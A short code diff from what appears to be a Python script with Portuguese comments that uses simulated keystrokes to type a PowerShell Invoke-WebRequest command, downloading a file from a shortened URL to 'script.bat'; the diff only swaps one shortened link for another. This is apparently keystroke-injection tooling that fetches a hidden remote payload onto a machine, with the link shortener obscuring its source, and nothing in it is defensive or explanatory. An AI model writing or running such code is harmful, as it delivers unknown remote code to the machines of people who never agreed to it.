@@ -101,7 +101,7 @@ async def conectar():
     keyboard.write('powershell -Command "Invoke-WebRequest -Uri "')
 
     await asyncio.sleep(2)  # Aguarde a janela de conexão abrir
-    keyboard.write('https://encurtador.com.br/nF245')
+    keyboard.write('https://encurtador.com.br/REE2o')
     await asyncio.sleep(2)  # Aguarde a janela de conexão abrir
     keyboard.write('" -OutFile "script.bat"')
     await asyncio.sleep(2)  # Aguarde a janela de conexão abrir
